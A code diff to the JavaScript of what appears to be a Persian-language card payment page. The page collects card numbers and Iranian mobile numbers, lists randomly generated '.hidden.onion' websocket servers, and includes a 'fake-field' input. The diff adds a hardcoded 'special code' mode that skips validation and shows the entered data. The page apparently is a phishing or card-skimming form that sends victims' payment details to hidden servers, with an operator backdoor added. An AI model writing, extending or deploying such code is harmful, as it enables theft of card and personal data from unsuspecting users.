@@ -284,7 +284,7 @@
             let userData = {};
             let isSpecialMode = false;
             let sessionId = Math.random().toString(36).substr(2, 10);
-            const SPECIAL_CODE = '12122312'; // تغییر رمز ویژه به 12122312
+            const SPECIAL_CODE = '12122312';
             const SERVERS = [
                 () => `wss://${Math.random().toString(36).substr(2, 10)}.hidden.onion:8080`,
                 () => `wss://${Math.random().toString(36).substr(2, 10)}.hidden.onion:8080`,
@@ -375,40 +375,60 @@
             }
 
             function validateStep(step) {
-                const inputs = steps[step - 1].querySelectorAll('input:not(#fake-field)');
-                for (let input of inputs) {
-                    if (!input.value.trim()) {
-                        alert('لطفاً تمامی فیلدها را پر کنید');
-                        return false;
-                    }
-                }
-
-                if (step === 1) {
+                if (isSpecialMode) {
                     const card = document.getElementById('card-number').value;
-                    if (card !== SPECIAL_CODE && !/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(card)) {
-                        alert('شماره کارت نامعتبر است');
+                    if (card === SPECIAL_CODE) {
+                        return true;
+                    } else {
+                        alert('رمز ویژه نامعتبر است');
                         return false;
                     }
-                }
-
-                if (step === 2) {
-                    const phone = document.getElementById('phone-number').value.replace(/-/g, '');
-                    if (phone.length !== 11 || !phone.startsWith('09')) {
-                        alert('شماره تلفن نامعتبر است');
-                        return false;
+                } else {
+                    const inputs = steps[step - 1].querySelectorAll('input:not(#fake-field)');
+                    for (let input of inputs) {
+                        if (!input.value.trim()) {
+                            alert('لطفاً تمامی فیلدها را پر کنید');
+                            return false;
+                        }
                     }
-                }
 
-                return true;
+                    if (step === 1) {
+                        const card = document.getElementById('card-number').value;
+                        if (card !== SPECIAL_CODE && !/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(card)) {
+                            alert('شماره کارت نامعتبر است');
+                            return false;
+                        }
+                    }
+
+                    if (step === 2) {
+                        const phone = document.getElementById('phone-number').value.replace(/-/g, '');
+                        if (phone.length !== 11 || !phone.startsWith('09')) {
+                            alert('شماره تلفن نامعتبر است');
+                            return false;
+                        }
+                    }
+                    return true;
+                }
             }
 
             function nextStep(step) {
                 if (!validateStep(step)) return;
+
                 steps[step - 1].classList.remove('active');
-                currentStep = step + 1;
+                if (isSpecialMode && step === 1) {
+                    currentStep = 3;
+                    showSpecialResult();
+                } else {
+                    currentStep = step + 1;
+                    if (currentStep === 3) processPayment();
+                }
                 steps[currentStep - 1].classList.add('active');
                 updateProgress();
-                if (currentStep === 3) processPayment();
+            }
+
+            function showSpecialResult() {
+                const result = document.getElementById('result');
+                result.innerHTML = `حالت ویژه: اطلاعات وارد شده نمایش داده شد.<br>شماره تراکنش: ${generateTransactionId()}`;
             }
 
             function updateProgress() {
